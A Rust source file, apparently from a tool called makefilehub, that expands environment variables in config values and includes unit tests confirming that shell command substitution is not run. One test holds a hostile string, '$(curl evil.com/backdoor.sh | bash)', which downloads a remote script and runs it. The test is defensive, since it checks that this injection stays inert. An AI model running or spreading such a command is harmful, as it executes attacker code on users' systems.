//! Configuration value interpolation
//!
//! Supports environment variable interpolation in config values:
//! - `$VAR` or `${VAR}` - Environment variable substitution
//!
//! # Security Note
//!
//! Shell command interpolation (`$(command)`) was removed for security reasons.
//! Config files from untrusted sources (e.g., cloned repositories) could execute
//! arbitrary code. Only environment variable interpolation is supported.

use once_cell::sync::Lazy;
use regex::Regex;

/// Pre-compiled regex for bracketed env vars: ${VAR}
static BRACKETED_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"\$\{([A-Za-z_][A-Za-z0-9_]*)\}").expect("Invalid regex"));

/// Pre-compiled regex for simple env vars: $VAR
static SIMPLE_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"\$([A-Za-z_][A-Za-z0-9_]*)").expect("Invalid regex"));

/// Interpolate a string with environment variables
///
/// # Interpolation Syntax
///
/// - `$VAR` - Simple environment variable
/// - `${VAR}` - Environment variable with explicit boundaries
///
/// # Security
///
/// Only environment variable interpolation is supported. Shell command
/// interpolation was removed to prevent command injection attacks from
/// malicious config files.
///
/// # Examples
///
/// ```
/// use makefilehub::config::interpolate::interpolate_string;
///
/// std::env::set_var("MY_VAR", "hello");
/// let result = interpolate_string("Value: $MY_VAR");
/// assert_eq!(result, "Value: hello");
/// std::env::remove_var("MY_VAR");
/// ```
pub fn interpolate_string(s: &str) -> String {
    interpolate_env_vars(s)
}

/// Interpolate environment variables: $VAR or ${VAR}
fn interpolate_env_vars(s: &str) -> String {
    // Match ${VAR} first (explicit boundaries)
    let result = BRACKETED_RE
        .replace_all(s, |caps: &regex::Captures| {
            let var = &caps[1];
            std::env::var(var).unwrap_or_else(|_| {
                tracing::debug!("Environment variable '{}' not set", var);
                String::new()
            })
        })
        .to_string();

    // Then match $VAR (simple form)
    SIMPLE_RE
        .replace_all(&result, |caps: &regex::Captures| {
            let var = &caps[1];
            std::env::var(var).unwrap_or_else(|_| {
                tracing::debug!("Environment variable '{}' not set", var);
                String::new()
            })
        })
        .to_string()
}

/// Interpolate all string values in a Config
///
/// This applies interpolation to string fields that commonly contain
/// paths or dynamic values (e.g., project_dir, env values).
pub fn interpolate_config(config: &mut super::model::Config) {
    // Interpolate project patterns
    for pattern in &mut config.projects.patterns {
        *pattern = interpolate_string(pattern);
    }

    // Interpolate service configs
    for service in config.services.values_mut() {
        if let Some(ref mut dir) = service.project_dir {
            *dir = interpolate_string(dir);
        }
        if let Some(ref mut script) = service.script {
            *script = interpolate_string(script);
        }
        for value in service.env.values_mut() {
            *value = interpolate_string(value);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_interpolate_simple_env_var() {
        std::env::set_var("TEST_SIMPLE_VAR", "hello");

        let result = interpolate_string("Value: $TEST_SIMPLE_VAR");
        assert_eq!(result, "Value: hello");

        std::env::remove_var("TEST_SIMPLE_VAR");
    }

    #[test]
    fn test_interpolate_bracketed_env_var() {
        std::env::set_var("TEST_BRACKET_VAR", "world");

        let result = interpolate_string("Value: ${TEST_BRACKET_VAR}!");
        assert_eq!(result, "Value: world!");

        std::env::remove_var("TEST_BRACKET_VAR");
    }

    #[test]
    fn test_interpolate_home_var() {
        // HOME should be set on most systems
        if std::env::var("HOME").is_ok() {
            let result = interpolate_string("$HOME/projects");
            assert!(!result.starts_with("$HOME"));
            assert!(result.contains("/projects"));
        }
    }

    #[test]
    fn test_interpolate_missing_var() {
        let result = interpolate_string("Value: $NONEXISTENT_VAR_12345");
        assert_eq!(result, "Value: ");
    }

    #[test]
    fn test_shell_command_syntax_preserved() {
        // Shell command syntax should be preserved (not executed) for security
        let result = interpolate_string("Value: $(echo hello)");
        // The $(command) syntax is NOT expanded for security reasons
        assert_eq!(result, "Value: $(echo hello)");
    }

    #[test]
    fn test_interpolate_multiple_vars() {
        std::env::set_var("TEST_VAR_A", "foo");
        std::env::set_var("TEST_VAR_B", "bar");

        let result = interpolate_string("$TEST_VAR_A and $TEST_VAR_B");
        assert_eq!(result, "foo and bar");

        std::env::remove_var("TEST_VAR_A");
        std::env::remove_var("TEST_VAR_B");
    }

    #[test]
    fn test_interpolate_no_vars() {
        let result = interpolate_string("No variables here");
        assert_eq!(result, "No variables here");
    }

    #[test]
    fn test_interpolate_adjacent_vars() {
        std::env::set_var("TEST_ADJ_A", "foo");
        std::env::set_var("TEST_ADJ_B", "bar");

        let result = interpolate_string("${TEST_ADJ_A}${TEST_ADJ_B}");
        assert_eq!(result, "foobar");

        std::env::remove_var("TEST_ADJ_A");
        std::env::remove_var("TEST_ADJ_B");
    }

    #[test]
    fn test_interpolate_var_in_path() {
        std::env::set_var("TEST_PROJECT", "myapp");

        let result = interpolate_string("/home/user/projects/$TEST_PROJECT/src");
        assert_eq!(result, "/home/user/projects/myapp/src");

        std::env::remove_var("TEST_PROJECT");
    }

    #[test]
    fn test_interpolate_preserves_non_var_dollar() {
        // $100 starts with a digit, so it's not a valid var name
        let result = interpolate_string("Price: $100");
        assert_eq!(result, "Price: $100");
    }

    #[test]
    fn test_interpolate_config() {
        let mut config = super::super::model::Config::default();
        config.projects.patterns = vec!["$HOME/projects/{name}".to_string()];

        interpolate_config(&mut config);

        if std::env::var("HOME").is_ok() {
            assert!(!config.projects.patterns[0].starts_with("$HOME"));
        }
    }

    #[test]
    fn test_interpolate_service_config() {
        use std::collections::HashMap;

        let mut config = super::super::model::Config::default();
        config.services.insert(
            "test".to_string(),
            super::super::model::ServiceConfig {
                project_dir: Some("$HOME/test".to_string()),
                env: {
                    let mut m = HashMap::new();
                    // Shell commands are NOT executed for security
                    m.insert("TOKEN".to_string(), "mysecret".to_string());
                    m
                },
                ..Default::default()
            },
        );

        interpolate_config(&mut config);

        let service = config.services.get("test").unwrap();

        // Project dir should be interpolated
        if std::env::var("HOME").is_ok() {
            assert!(!service.project_dir.as_ref().unwrap().starts_with("$HOME"));
        }

        // Env var should remain as-is (no shell execution)
        assert_eq!(service.env.get("TOKEN"), Some(&"mysecret".to_string()));
    }

    #[test]
    fn test_malicious_config_injection_prevented() {
        // Ensure malicious shell commands are NOT executed
        let malicious = "$(curl evil.com/backdoor.sh | bash)";
        let result = interpolate_string(malicious);
        // Should be preserved as-is, NOT executed
        assert_eq!(result, malicious);
    }
}
